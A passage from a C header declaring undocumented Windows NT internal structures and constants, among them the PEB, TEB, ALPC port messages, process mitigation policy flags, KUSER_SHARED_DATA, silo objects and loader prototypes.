    WOW64_POINTER(ULONG_PTR) Win32ClientInfo[62];
    WOW64_POINTER(PVOID) glDispatchTable[233];
    WOW64_POINTER(ULONG_PTR) glReserved1[29];
    WOW64_POINTER(PVOID) glReserved2;
    WOW64_POINTER(PVOID) glSectionInfo;
    WOW64_POINTER(PVOID) glSection;
    WOW64_POINTER(PVOID) glTable;
    WOW64_POINTER(PVOID) glCurrentRC;
    WOW64_POINTER(PVOID) glContext;

    NTSTATUS LastStatusValue;
    UNICODE_STRING32 StaticUnicodeString;
    WCHAR StaticUnicodeBuffer[261];

    WOW64_POINTER(PVOID) DeallocationStack;
    WOW64_POINTER(PVOID) TlsSlots[64];
    LIST_ENTRY32 TlsLinks;
} TEB32, *PTEB32;

typedef struct _PEB_LDR_DATA {
    ULONG Length;
    BOOLEAN Initialized;
    HANDLE SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
    PVOID EntryInProgress;
    BOOLEAN ShutdownInProgress;
    HANDLE ShutdownThreadId;
} PEB_LDR_DATA, *PPEB_LDR_DATA;

typedef struct _GDI_HANDLE_ENTRY {
    union
    {
        PVOID Object;
        PVOID NextFree;
    };
    union
    {
        struct
        {
            USHORT ProcessId;
            USHORT Lock : 1;
            USHORT Count : 15;
        };
        ULONG Value;
    } Owner;
    USHORT Unique;
    UCHAR Type;
    UCHAR Flags;
    PVOID UserPointer;
} GDI_HANDLE_ENTRY, *PGDI_HANDLE_ENTRY;

typedef struct _GDI_SHARED_MEMORY {
    GDI_HANDLE_ENTRY Handles[GDI_MAX_HANDLE_COUNT];
} GDI_SHARED_MEMORY, *PGDI_SHARED_MEMORY;

#define FLS_MAXIMUM_AVAILABLE 128
#define TLS_MINIMUM_AVAILABLE 64
#define TLS_EXPANSION_SLOTS 1024

#define DOS_MAX_COMPONENT_LENGTH 255
#define DOS_MAX_PATH_LENGTH (DOS_MAX_COMPONENT_LENGTH + 5)

typedef struct _CURDIR {
    UNICODE_STRING DosPath;
    HANDLE Handle;
} CURDIR, *PCURDIR;

#define RTL_USER_PROC_CURDIR_CLOSE 0x00000002
#define RTL_USER_PROC_CURDIR_INHERIT 0x00000003

typedef struct _RTL_DRIVE_LETTER_CURDIR {
    USHORT Flags;
    USHORT Length;
    ULONG TimeStamp;
    STRING DosPath;
} RTL_DRIVE_LETTER_CURDIR, *PRTL_DRIVE_LETTER_CURDIR;

typedef struct _RTL_USER_PROCESS_PARAMETERS {
    ULONG MaximumLength;
    ULONG Length;

    ULONG Flags;
    ULONG DebugFlags;

    HANDLE ConsoleHandle;
    ULONG ConsoleFlags;
    HANDLE StandardInput;
    HANDLE StandardOutput;
    HANDLE StandardError;

    CURDIR CurrentDirectory;
    UNICODE_STRING DllPath;
    UNICODE_STRING ImagePathName;
    UNICODE_STRING CommandLine;
    PVOID Environment;

    ULONG StartingX;
    ULONG StartingY;
    ULONG CountX;
    ULONG CountY;
    ULONG CountCharsX;
    ULONG CountCharsY;
    ULONG FillAttribute;

    ULONG WindowFlags;
    ULONG ShowWindowFlags;
    UNICODE_STRING WindowTitle;
    UNICODE_STRING DesktopInfo;
    UNICODE_STRING ShellInfo;
    UNICODE_STRING RuntimeData;
    RTL_DRIVE_LETTER_CURDIR CurrentDirectories[RTL_MAX_DRIVE_LETTERS];

    ULONG EnvironmentSize;
    ULONG EnvironmentVersion;
    PVOID PackageDependencyData; //8+
    ULONG ProcessGroupId;
    // ULONG LoaderThreads;
} RTL_USER_PROCESS_PARAMETERS, *PRTL_USER_PROCESS_PARAMETERS;

typedef struct _PEB {
    BOOLEAN InheritedAddressSpace;
    BOOLEAN ReadImageFileExecOptions;
    BOOLEAN BeingDebugged;
    union
    {
        BOOLEAN BitField;
        struct
        {
            BOOLEAN ImageUsesLargePages : 1;
            BOOLEAN IsProtectedProcess : 1;
            BOOLEAN IsImageDynamicallyRelocated : 1;
            BOOLEAN SkipPatchingUser32Forwarders : 1;
            BOOLEAN IsPackagedProcess : 1;
            BOOLEAN IsAppContainer : 1;
            BOOLEAN IsProtectedProcessLight : 1;
            BOOLEAN IsLongPathAwareProcess : 1;
        };
    };
    HANDLE Mutant;

    PVOID ImageBaseAddress;
    PPEB_LDR_DATA Ldr;
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters;
    PVOID SubSystemData;
    PVOID ProcessHeap;
    PRTL_CRITICAL_SECTION FastPebLock;
    PVOID AtlThunkSListPtr;
    PVOID IFEOKey;
    union
    {
        ULONG CrossProcessFlags;
        struct
        {
            ULONG ProcessInJob : 1;
            ULONG ProcessInitializing : 1;
            ULONG ProcessUsingVEH : 1;
            ULONG ProcessUsingVCH : 1;
            ULONG ProcessUsingFTH : 1;
            ULONG ProcessPreviouslyThrottled : 1;
            ULONG ProcessCurrentlyThrottled : 1;
            ULONG ProcessImagesHotPatched : 1;
            ULONG ReservedBits0 : 24;
        };
        ULONG EnvironmentUpdateCount;
    };
    union
    {
        PVOID KernelCallbackTable;
        PVOID UserSharedInfoPtr;
    };
    ULONG SystemReserved[1];
    ULONG AtlThunkSListPtr32;
    PVOID ApiSetMap;
    ULONG TlsExpansionCounter;
    PVOID TlsBitmap;
    ULONG TlsBitmapBits[2];
    PVOID ReadOnlySharedMemoryBase;
    PVOID HotpatchInformation;
    PVOID *ReadOnlyStaticServerData;
    PVOID AnsiCodePageData;
    PVOID OemCodePageData;
    PVOID UnicodeCaseTableData;

    ULONG NumberOfProcessors;
    ULONG NtGlobalFlag;

    LARGE_INTEGER CriticalSectionTimeout;
    SIZE_T HeapSegmentReserve;
    SIZE_T HeapSegmentCommit;
    SIZE_T HeapDeCommitTotalFreeThreshold;
    SIZE_T HeapDeCommitFreeBlockThreshold;

    ULONG NumberOfHeaps;
    ULONG MaximumNumberOfHeaps;
    PVOID *ProcessHeaps;

    PVOID GdiSharedHandleTable;
    PVOID ProcessStarterHelper;
    ULONG GdiDCAttributeList;

    PRTL_CRITICAL_SECTION LoaderLock;

    ULONG OSMajorVersion;
    ULONG OSMinorVersion;
    USHORT OSBuildNumber;
    USHORT OSCSDVersion;
    ULONG OSPlatformId;
    ULONG ImageSubsystem;
    ULONG ImageSubsystemMajorVersion;
    ULONG ImageSubsystemMinorVersion;
    ULONG_PTR ImageProcessAffinityMask;
    GDI_HANDLE_BUFFER GdiHandleBuffer;
    PVOID PostProcessInitRoutine;

    PVOID TlsExpansionBitmap;
    ULONG TlsExpansionBitmapBits[32];

    ULONG SessionId;

    ULARGE_INTEGER AppCompatFlags;
    ULARGE_INTEGER AppCompatFlagsUser;
    PVOID pShimData;
    PVOID AppCompatInfo;

    UNICODE_STRING CSDVersion;

    PVOID ActivationContextData;
    PVOID ProcessAssemblyStorageMap;
    PVOID SystemDefaultActivationContextData;
    PVOID SystemAssemblyStorageMap;

    SIZE_T MinimumStackCommit;

    PVOID *FlsCallback;
    LIST_ENTRY FlsListHead;
    PVOID FlsBitmap;
    ULONG FlsBitmapBits[FLS_MAXIMUM_AVAILABLE / (sizeof(ULONG) * 8)];
    ULONG FlsHighIndex;

    PVOID WerRegistrationData;
    PVOID WerShipAssertPtr;
    PVOID pContextData;
    PVOID pImageHeaderHash;
    union
    {
        ULONG TracingFlags;
        struct
        {
            ULONG HeapTracingEnabled : 1;
            ULONG CritSecTracingEnabled : 1;
            ULONG LibLoaderTracingEnabled : 1;
            ULONG SpareTracingBits : 29;
        };
    };
    ULONGLONG CsrServerReadOnlySharedMemoryBase;
} PEB, *PPEB;

typedef struct _TEB_ACTIVE_FRAME_CONTEXT {
    ULONG Flags;
    PSTR FrameName;
} TEB_ACTIVE_FRAME_CONTEXT, *PTEB_ACTIVE_FRAME_CONTEXT;

typedef struct _TEB_ACTIVE_FRAME {
    ULONG Flags;
    struct _TEB_ACTIVE_FRAME *Previous;
    PTEB_ACTIVE_FRAME_CONTEXT Context;
} TEB_ACTIVE_FRAME, *PTEB_ACTIVE_FRAME;

#define GDI_BATCH_BUFFER_SIZE 310

typedef struct _GDI_TEB_BATCH {
    ULONG	Offset;
    UCHAR	Alignment[4];
    ULONG_PTR HDC;
    ULONG	Buffer[GDI_BATCH_BUFFER_SIZE];
} GDI_TEB_BATCH, *PGDI_TEB_BATCH;

typedef struct _TEB {
    NT_TIB NtTib;

    PVOID EnvironmentPointer;
    CLIENT_ID ClientId;
    PVOID ActiveRpcHandle;
    PVOID ThreadLocalStoragePointer;
    PPEB ProcessEnvironmentBlock;

    ULONG LastErrorValue;
    ULONG CountOfOwnedCriticalSections;
    PVOID CsrClientThread;
    PVOID Win32ThreadInfo;
    ULONG User32Reserved[26];
    ULONG UserReserved[5];
    PVOID WOW32Reserved;
    LCID CurrentLocale;
    ULONG FpSoftwareStatusRegister;
    PVOID SystemReserved1[54];
    NTSTATUS ExceptionCode;
    PVOID ActivationContextStackPointer;
#if defined(_M_X64)
    UCHAR SpareBytes[24];
#else
    UCHAR SpareBytes[36];
#endif
    ULONG TxFsContext;

    GDI_TEB_BATCH GdiTebBatch;
    CLIENT_ID RealClientId;
    HANDLE GdiCachedProcessHandle;
    ULONG GdiClientPID;
    ULONG GdiClientTID;
    PVOID GdiThreadLocalInfo;
    ULONG_PTR Win32ClientInfo[62];
    PVOID glDispatchTable[233];
    ULONG_PTR glReserved1[29];
    PVOID glReserved2;
    PVOID glSectionInfo;
    PVOID glSection;
    PVOID glTable;
    PVOID glCurrentRC;
    PVOID glContext;

    NTSTATUS LastStatusValue;
    UNICODE_STRING StaticUnicodeString;
    WCHAR StaticUnicodeBuffer[261];

    PVOID DeallocationStack;
    PVOID TlsSlots[64];
    LIST_ENTRY TlsLinks;

    PVOID Vdm;
    PVOID ReservedForNtRpc;
    PVOID DbgSsReserved[2];

    ULONG HardErrorMode;
#if defined(_M_X64)
    PVOID Instrumentation[11];
#else
    PVOID Instrumentation[9];
#endif
    GUID ActivityId;

    PVOID SubProcessTag;
    PVOID EtwLocalData;
    PVOID EtwTraceData;
    PVOID WinSockData;
    ULONG GdiBatchCount;

    union
    {
        PROCESSOR_NUMBER CurrentIdealProcessor;
        ULONG IdealProcessorValue;
        struct
        {
            UCHAR ReservedPad0;
            UCHAR ReservedPad1;
            UCHAR ReservedPad2;
            UCHAR IdealProcessor;
        };
    };

    ULONG GuaranteedStackBytes;
    PVOID ReservedForPerf;
    PVOID ReservedForOle;
    ULONG WaitingOnLoaderLock;
    PVOID SavedPriorityState;
    ULONG_PTR SoftPatchPtr1;
    PVOID ThreadPoolData;
    PVOID *TlsExpansionSlots;
#if defined(_M_X64)
    PVOID DeallocationBStore;
    PVOID BStoreLimit;
#endif
    ULONG MuiGeneration;
    ULONG IsImpersonating;
    PVOID NlsCache;
    PVOID pShimData;
    ULONG HeapVirtualAffinity;
    HANDLE CurrentTransactionHandle;
    PTEB_ACTIVE_FRAME ActiveFrame;
    PVOID FlsData;

    PVOID PreferredLanguages;
    PVOID UserPrefLanguages;
    PVOID MergedPrefLanguages;
    ULONG MuiImpersonation;

    union
    {
        USHORT CrossTebFlags;
        USHORT SpareCrossTebBits : 16;
    };
    union
    {
        USHORT SameTebFlags;
        struct
        {
            USHORT SafeThunkCall : 1;
            USHORT InDebugPrint : 1;
            USHORT HasFiberData : 1;
            USHORT SkipThreadAttach : 1;
            USHORT WerInShipAssertCode : 1;
            USHORT RanProcessInit : 1;
            USHORT ClonedThread : 1;
            USHORT SuppressDebugMsg : 1;
            USHORT DisableUserStackWalk : 1;
            USHORT RtlExceptionAttached : 1;
            USHORT InitialThread : 1;
            USHORT SpareSameTebBits : 1;
        };
    };

    PVOID TxnScopeEnterCallback;
    PVOID TxnScopeExitCallback;
    PVOID TxnScopeContext;
    ULONG LockCount;
    ULONG SpareUlong0;
    PVOID ResourceRetValue;
} TEB, *PTEB;

typedef struct _PROCESS_DEVICEMAP_INFORMATION {
    union {
        struct {
            HANDLE DirectoryHandle;
        } Set;
        struct {
            ULONG DriveMap;
            UCHAR DriveType[32];
        } Query;
    };
} PROCESS_DEVICEMAP_INFORMATION, *PPROCESS_DEVICEMAP_INFORMATION;

__inline struct _PEB * NtCurrentPeb() { return NtCurrentTeb()->ProcessEnvironmentBlock; }

/*
** PEB/TEB END
*/

/*
** ALPC START
*/

typedef struct _PORT_MESSAGE {
    union {
        struct {
            CSHORT DataLength;
            CSHORT TotalLength;
        } s1;
        ULONG Length;
    } u1;
    union {
        struct {
            CSHORT Type;
            CSHORT DataInfoOffset;
        } s2;
        ULONG ZeroInit;
    } u2;
    union {
        CLIENT_ID ClientId;
        double DoNotUseThisField;       // Force quadword alignment
    } u3;
    ULONG MessageId;
    union {
        ULONG ClientViewSize;               // Only valid on LPC_CONNECTION_REQUEST message
        ULONG CallbackId;                   // Only valid on LPC_REQUEST message
    } u4;
    UCHAR Reserved[8];
} PORT_MESSAGE, *PPORT_MESSAGE;

// end_ntsrv

typedef struct _PORT_DATA_ENTRY {
    PVOID Base;
    ULONG Size;
} PORT_DATA_ENTRY, *PPORT_DATA_ENTRY;

typedef struct _PORT_DATA_INFORMATION {
    ULONG CountDataEntries;
    PORT_DATA_ENTRY DataEntries[1];
} PORT_DATA_INFORMATION, *PPORT_DATA_INFORMATION;

#define LPC_REQUEST             1
#define LPC_REPLY               2
#define LPC_DATAGRAM            3
#define LPC_LOST_REPLY          4
#define LPC_PORT_CLOSED         5
#define LPC_CLIENT_DIED         6
#define LPC_EXCEPTION           7
#define LPC_DEBUG_EVENT         8
#define LPC_ERROR_EVENT         9
#define LPC_CONNECTION_REQUEST 10

#define PORT_VALID_OBJECT_ATTRIBUTES (OBJ_CASE_INSENSITIVE)
#define PORT_MAXIMUM_MESSAGE_LENGTH 256

typedef struct _LPC_CLIENT_DIED_MSG {
    PORT_MESSAGE PortMsg;
    LARGE_INTEGER CreateTime;
} LPC_CLIENT_DIED_MSG, *PLPC_CLIENT_DIED_MSG;

//#pragma pack(push, 1)
typedef struct _PORT_VIEW {
    ULONG Length;
    HANDLE SectionHandle;
    ULONG SectionOffset;
    SIZE_T ViewSize;
    PVOID ViewBase;
    PVOID ViewRemoteBase;
} PORT_VIEW, *PPORT_VIEW;

typedef struct _REMOTE_PORT_VIEW {
    ULONG Length;
    SIZE_T ViewSize;
    PVOID ViewBase;
} REMOTE_PORT_VIEW, *PREMOTE_PORT_VIEW;
//#pragma pack(pop)
/*
** ALPC END
*/

/*
**  MITIGATION POLICY START
*/

//redefine enum

#define ProcessDEPPolicy                    0
#define ProcessASLRPolicy                   1
#define ProcessDynamicCodePolicy            2
#define ProcessStrictHandleCheckPolicy      3
#define ProcessSystemCallDisablePolicy      4
#define ProcessMitigationOptionsMask        5
#define ProcessExtensionPointDisablePolicy  6
#define ProcessControlFlowGuardPolicy       7
#define ProcessSignaturePolicy              8
#define ProcessFontDisablePolicy            9
#define ProcessImageLoadPolicy              10
#define ProcessSystemCallFilterPolicy       11
#define ProcessPayloadRestrictionPolicy     12
#define ProcessChildProcessPolicy           13
#define ProcessSideChannelIsolationPolicy   14

typedef struct tagPROCESS_MITIGATION_BINARY_SIGNATURE_POLICY_W10 {
    union {
        DWORD Flags;
        struct {
            DWORD MicrosoftSignedOnly : 1;
            DWORD StoreSignedOnly : 1;
            DWORD MitigationOptIn : 1;
            DWORD AuditMicrosoftSignedOnly : 1;
            DWORD AuditStoreSignedOnly : 1;
            DWORD ReservedFlags : 27;
        } DUMMYSTRUCTNAME;
    } DUMMYUNIONNAME;
} PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY_W10, *PPROCESS_MITIGATION_BINARY_SIGNATURE_POLICY_W10;

typedef struct tagPROCESS_MITIGATION_DYNAMIC_CODE_POLICY_W10 {
    union {
        DWORD Flags;
        struct {
            DWORD ProhibitDynamicCode : 1;
            DWORD AllowThreadOptOut : 1;
            DWORD AllowRemoteDowngrade : 1;
            DWORD AuditProhibitDynamicCode : 1;
            DWORD ReservedFlags : 28;
        } DUMMYSTRUCTNAME;
    } DUMMYUNIONNAME;
} PROCESS_MITIGATION_DYNAMIC_CODE_POLICY_W10, *PPROCESS_MITIGATION_DYNAMIC_CODE_POLICY_W10;

typedef struct tagPROCESS_MITIGATION_CONTROL_FLOW_GUARD_POLICY_W10 {
    union {
        DWORD Flags;
        struct {
            DWORD EnableControlFlowGuard : 1;
            DWORD EnableExportSuppression : 1;
            DWORD StrictMode : 1;
            DWORD ReservedFlags : 29;
        } DUMMYSTRUCTNAME;
    } DUMMYUNIONNAME;
} PROCESS_MITIGATION_CONTROL_FLOW_GUARD_POLICY_W10, *PPROCESS_MITIGATION_CONTROL_FLOW_GUARD_POLICY_W10;

typedef struct tagPROCESS_MITIGATION_FONT_DISABLE_POLICY_W10 {
    union {
        DWORD Flags;
        struct {
            DWORD DisableNonSystemFonts : 1;
            DWORD AuditNonSystemFontLoading : 1;
            DWORD ReservedFlags : 30;
        } DUMMYSTRUCTNAME;
    } DUMMYUNIONNAME;
} PROCESS_MITIGATION_FONT_DISABLE_POLICY_W10, *PPROCESS_MITIGATION_FONT_DISABLE_POLICY_W10;

typedef struct tagPROCESS_MITIGATION_IMAGE_LOAD_POLICY_W10 {
    union {
        DWORD Flags;
        struct {
            DWORD NoRemoteImages : 1;
            DWORD NoLowMandatoryLabelImages : 1;
            DWORD PreferSystem32Images : 1;
            DWORD AuditNoRemoteImages : 1;
            DWORD AuditNoLowMandatoryLabelImages : 1;
            DWORD ReservedFlags : 27;
        } DUMMYSTRUCTNAME;
    } DUMMYUNIONNAME;
} PROCESS_MITIGATION_IMAGE_LOAD_POLICY_W10, *PPROCESS_MITIGATION_IMAGE_LOAD_POLICY_W10;

typedef struct tagPROCESS_MITIGATION_SYSTEM_CALL_FILTER_POLICY_W10 {
    union {
        ULONG Flags;
        struct {
            ULONG FilterId : 4;
            ULONG ReservedFlags : 28;
        } DUMMYSTRUCTNAME;
    } DUMMYUNIONNAME;
} PROCESS_MITIGATION_SYSTEM_CALL_FILTER_POLICY_W10, *PPROCESS_MITIGATION_SYSTEM_CALL_FILTER_POLICY_W10;

typedef struct tagPROCESS_MITIGATION_PAYLOAD_RESTRICTION_POLICY_W10 {
    union {
        ULONG Flags;
        struct {
            ULONG EnableExportAddressFilter : 1;
            ULONG AuditExportAddressFilter : 1;
            ULONG EnableExportAddressFilterPlus : 1;
            ULONG AuditExportAddressFilterPlus : 1;
            ULONG EnableImportAddressFilter : 1;
            ULONG AuditImportAddressFilter : 1;
            ULONG EnableRopStackPivot : 1;
            ULONG AuditRopStackPivot : 1;
            ULONG EnableRopCallerCheck : 1;
            ULONG AuditRopCallerCheck : 1;
            ULONG EnableRopSimExec : 1;
            ULONG AuditRopSimExec : 1;
            ULONG ReservedFlags : 20;
        } DUMMYSTRUCTNAME;
    } DUMMYUNIONNAME;
} PROCESS_MITIGATION_PAYLOAD_RESTRICTION_POLICY_W10, *PPROCESS_MITIGATION_PAYLOAD_RESTRICTION_POLICY_W10;

typedef struct tagPROCESS_MITIGATION_CHILD_PROCESS_POLICY_W10 {
    union {
        ULONG Flags;
        struct {
            ULONG NoChildProcessCreation : 1;
            ULONG AuditNoChildProcessCreation : 1;
            ULONG AllowSecureProcessCreation : 1;
            ULONG ReservedFlags : 29;
        } DUMMYSTRUCTNAME;
    } DUMMYUNIONNAME;
} PROCESS_MITIGATION_CHILD_PROCESS_POLICY_W10, *PPROCESS_MITIGATION_CHILD_PROCESS_POLICY_W10;

typedef struct _PROCESS_MITIGATION_POLICY_INFORMATION {
    PROCESS_MITIGATION_POLICY Policy;
    union
    {
        PROCESS_MITIGATION_ASLR_POLICY ASLRPolicy;
        PROCESS_MITIGATION_STRICT_HANDLE_CHECK_POLICY StrictHandleCheckPolicy;
        PROCESS_MITIGATION_SYSTEM_CALL_DISABLE_POLICY SystemCallDisablePolicy;
        PROCESS_MITIGATION_EXTENSION_POINT_DISABLE_POLICY ExtensionPointDisablePolicy;
        PROCESS_MITIGATION_DYNAMIC_CODE_POLICY_W10 DynamicCodePolicy;
        PROCESS_MITIGATION_CONTROL_FLOW_GUARD_POLICY_W10 ControlFlowGuardPolicy;
        PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY_W10 SignaturePolicy;
        PROCESS_MITIGATION_FONT_DISABLE_POLICY_W10 FontDisablePolicy;
        PROCESS_MITIGATION_IMAGE_LOAD_POLICY_W10 ImageLoadPolicy;
        PROCESS_MITIGATION_SYSTEM_CALL_FILTER_POLICY_W10 SystemCallFilterPolicy;
        PROCESS_MITIGATION_PAYLOAD_RESTRICTION_POLICY_W10 PayloadRestrictionPolicy;
        PROCESS_MITIGATION_CHILD_PROCESS_POLICY_W10 ChildProcessPolicy;
    };
} PROCESS_MITIGATION_POLICY_INFORMATION, *PPROCESS_MITIGATION_POLICY_INFORMATION;

/*
**  MITIGATION POLICY END
*/

/*
** KUSER_SHARED_DATA START
*/
#define NX_SUPPORT_POLICY_ALWAYSOFF 0
#define NX_SUPPORT_POLICY_ALWAYSON  1
#define NX_SUPPORT_POLICY_OPTIN     2
#define NX_SUPPORT_POLICY_OPTOUT    3

#include <pshpack4.h>
typedef struct _KSYSTEM_TIME {
    ULONG LowPart;
    LONG High1Time;
    LONG High2Time;
} KSYSTEM_TIME, *PKSYSTEM_TIME;
#include <poppack.h>

typedef enum _NT_PRODUCT_TYPE {
    NtProductWinNt = 1,
    NtProductLanManNt,
    NtProductServer
} NT_PRODUCT_TYPE, *PNT_PRODUCT_TYPE;

#define PROCESSOR_FEATURE_MAX 64

typedef enum _ALTERNATIVE_ARCHITECTURE_TYPE {
    StandardDesign,                 // None == 0 == standard design
    NEC98x86,                       // NEC PC98xx series on X86
    EndAlternatives                 // past end of known alternatives
} ALTERNATIVE_ARCHITECTURE_TYPE;

//
// Define Address of User Shared Data
//
#define MM_SHARED_USER_DATA_VA      0x000000007FFE0000

//
// WARNING: this definition is OS version dependent.
// Structure maybe incomplete.
//
#include <pshpack4.h>
typedef struct _KUSER_SHARED_DATA {

    ULONG TickCountLowDeprecated;
    ULONG TickCountMultiplier;

    volatile KSYSTEM_TIME InterruptTime;
    volatile KSYSTEM_TIME SystemTime;
    volatile KSYSTEM_TIME TimeZoneBias;

    USHORT ImageNumberLow;
    USHORT ImageNumberHigh;

    WCHAR NtSystemRoot[260];

    ULONG MaxStackTraceDepth;
    ULONG CryptoExponent;
    ULONG TimeZoneId;
    ULONG LargePageMinimum;

    union {
        ULONG Reserved2[7];
        struct {
            ULONG AitSamplingValue;
            ULONG AppCompatFlag;
            struct {
                ULONG LowPart;
                ULONG HighPart;
            } RNGSeedVersion;
            ULONG GlobalValidationRunlevel;
            LONG TimeZoneBiasStamp;
            ULONG NtBuildNumber;
        };
    };

    NT_PRODUCT_TYPE NtProductType;
    BOOLEAN ProductTypeIsValid;
    UCHAR Reserved0[1];
    USHORT NativeProcessorArchitecture;

    ULONG NtMajorVersion;
    ULONG NtMinorVersion;

    BOOLEAN ProcessorFeatures[PROCESSOR_FEATURE_MAX];
    ULONG Reserved1;
    ULONG Reserved3;
    volatile ULONG TimeSlip;
    ALTERNATIVE_ARCHITECTURE_TYPE AlternativeArchitecture;
    ULONG AltArchitecturePad;
    LARGE_INTEGER SystemExpirationDate;
    ULONG SuiteMask;
    BOOLEAN KdDebuggerEnabled;

    union {
        UCHAR MitigationPolicies;
        struct {
            UCHAR NXSupportPolicy : 2;
            UCHAR SEHValidationPolicy : 2;
            UCHAR CurDirDevicesSkippedForDlls : 2;
            UCHAR Reserved : 2;
        };
    };

    UCHAR Reserved6[2];

    volatile ULONG ActiveConsoleId;
    volatile ULONG DismountCount;
    ULONG ComPlusPackage;
    ULONG LastSystemRITEventTickCount;
    ULONG NumberOfPhysicalPages;
    BOOLEAN SafeBootMode;
    UCHAR VirtualizationFlags;
    UCHAR Reserved12[2];

    union {
        ULONG SharedDataFlags;
        struct {
            ULONG DbgErrorPortPresent : 1;
            ULONG DbgElevationEnabled : 1;
            ULONG DbgVirtEnabled : 1;
            ULONG DbgInstallerDetectEnabled : 1;
            ULONG DbgLkgEnabled : 1;
            ULONG DbgDynProcessorEnabled : 1;
            ULONG DbgConsoleBrokerEnabled : 1;
            ULONG DbgSecureBootEnabled : 1;
            ULONG DbgMultiSessionSku : 1;
            ULONG DbgMultiUsersInSessionSku : 1;
            ULONG DbgStateSeparationEnabled : 1;
            ULONG SpareBits : 21;
        };
    };
    ULONG DataFlagsPad[1];
    ULONGLONG TestRetInstruction;
    LONGLONG QpcFrequency;

    ULONG SystemCall;
    ULONG SystemCallPad0;

    ULONGLONG SystemCallPad[2];

    union {
        volatile KSYSTEM_TIME TickCount;
        volatile ULONG64 TickCountQuad;
        ULONG ReservedTickCountOverlay[3];
    };

    ULONG TickCountPad[1];

    ULONG Cookie;
    ULONG CookiedPad;

    ULONG ConsoleSessionForegroundProcessId;

    ULONGLONG TimeUpdateLock;
    ULONGLONG BaselineSystemTimeQpc;
    ULONGLONG BaselineInterruptTimeQpc;
    ULONGLONG QpcSystemTimeIncrement;
    ULONGLONG QpcInterruptTimeIncrement;
    UCHAR QpcSystemTimeIncrementShift;
    UCHAR QpcInterruptTimeIncrementShift;
    USHORT UnparkedProcessorCount;

    ULONG EnclaveFeatureMask[4];
    union {
        ULONG Reserved8;
        ULONG TelemetryCoverageRound;
    };

    USHORT UserModeGlobalLogger[16];

    ULONG ImageFileExecutionOptions;
    ULONG LangGenerationCount;
    ULONGLONG Reserved4;

    volatile ULONG64 InterruptTimeBias;
    volatile ULONG64 QpcBias;

    ULONG ActiveProcessorCount;
    volatile UCHAR ActiveGroupCount;
    UCHAR Reserved9;

    union {
        USHORT QpcData;
        struct {
            UCHAR QpcBypassEnabled : 1;
            UCHAR QpcShift : 1;
        };
    };

    LARGE_INTEGER TimeZoneBiasEffectiveStart;
    LARGE_INTEGER TimeZoneBiasEffectiveEnd;

    XSTATE_CONFIGURATION XState;

} KUSER_SHARED_DATA, *PKUSER_SHARED_DATA;
#include <poppack.h>

#define USER_SHARED_DATA ((KUSER_SHARED_DATA * const)MM_SHARED_USER_DATA_VA)

/*
** KUSER_SHARED_DATA END
*/

/*
** FLT MANAGER START
*/

#define FLTFL_MANDATORY_UNLOAD_IN_PROGRESS  0x1
#define FLTFL_FILTERING_INITIATED           0x2
#define FLTFL_NAME_PROVIDER                 0x4
#define FLTFL_SUPPORTS_PIPES_MAILSLOTS      0x8

#define FLT_OBFL_DRAINING                   0x1
#define FLT_OBFL_ZOMBIED                    0x2
#define FLT_OBFL_TYPE_INSTANCE              0x1000000
#define FLT_OBFL_TYPE_FILTER                0x2000000
#define FLT_OBFL_TYPE_VOLUME                0x4000000

typedef struct _FLT_OBJECT {
    ULONG Flags;
    ULONG PointerCount;
    EX_RUNDOWN_REF RundownRef;
    LIST_ENTRY PrimaryLink;
} FLT_OBJECT, *PFLT_OBJECT;

typedef struct _FLT_SERVER_PORT_OBJECT {
    LIST_ENTRY FilterLink;
    PVOID ConnectNotify;
    PVOID DisconnectNotify;
    PVOID MessageNotify;
    PVOID Filter;
    PVOID Cookie;
    ULONG Flags;
    ULONG NumberOfConnections;
    ULONG MaxConnections;
} FLT_SERVER_PORT_OBJECT, *PFLT_SERVER_PORT_OBJECT;

/*
** FLT MANAGER END
*/

/*
** SILO START
*/

typedef struct _SYSTEM_ROOT_SILO_INFORMATION {
    ULONG NumberOfSilos;
    ULONG SiloIdList[1];
} SYSTEM_ROOT_SILO_INFORMATION, *PSYSTEM_ROOT_SILO_INFORMATION;

typedef struct _SILO_USER_SHARED_DATA {
    ULONG64 ServiceSessionId;
    ULONG ActiveConsoleId;
    LONGLONG ConsoleSessionForegroundProcessId;
    NT_PRODUCT_TYPE NtProductType;
    ULONG SuiteMask;
    ULONG SharedUserSessionId;
    BOOLEAN IsMultiSessionSku;
    WCHAR NtSystemRoot[260];
    USHORT UserModeGlobalLogger[16];
} SILO_USER_SHARED_DATA, *PSILO_USER_SHARED_DATA;

typedef struct _SILOOBJECT_ROOT_DIRECTORY {
    ULONG ControlFlags;
    UNICODE_STRING Path;
} SILOOBJECT_ROOT_DIRECTORY, *PSILOOBJECT_ROOT_DIRECTORY;

typedef struct _OBP_SYSTEM_DOS_DEVICE_STATE {
    ULONG GlobalDeviceMap;
    ULONG LocalDeviceCount[26];
} OBP_SYSTEM_DOS_DEVICE_STATE, *POBP_SYSTEM_DOS_DEVICE_STATE;

typedef struct _OBP_SILODRIVERSTATE {
    PDEVICE_MAP SystemDeviceMap;
    OBP_SYSTEM_DOS_DEVICE_STATE SystemDosDeviceState;
    EX_PUSH_LOCK DeviceMapLock;
    OBJECT_NAMESPACE_LOOKUPTABLE PrivateNamespaceLookupTable;
} OBP_SILODRIVERSTATE, *POBP_SILODRIVERSTATE;

//incomplete, values not important, change between versions.
typedef struct _ESERVERSILO_GLOBALS {
    OBP_SILODRIVERSTATE ObSiloState;
    //incomplete
} ESERVERSILO_GLOBALS, *PESERVERSILO_GLOBALS;

/*
** SILO END
*/

/*
**  LDR START
*/

typedef VOID(NTAPI *PLDR_LOADED_MODULE_ENUMERATION_CALLBACK_FUNCTION)(
    _In_    PCLDR_DATA_TABLE_ENTRY DataTableEntry,
    _In_    PVOID Context,
    _Inout_ BOOLEAN *StopEnumeration
    );

typedef VOID(CALLBACK *PLDR_DLL_NOTIFICATION_FUNCTION)(
    _In_ ULONG NotificationReason,
    _In_ PCLDR_DLL_NOTIFICATION_DATA NotificationData,
    _In_opt_ PVOID Context);

NTSTATUS NTAPI LdrAccessResource(
    _In_ PVOID DllHandle,
    _In_ CONST IMAGE_RESOURCE_DATA_ENTRY* ResourceDataEntry,
    _Out_opt_ PVOID *Address,
    _Out_opt_ PULONG Size);

NTSTATUS NTAPI LdrAddRefDll(
    _In_ ULONG Flags,
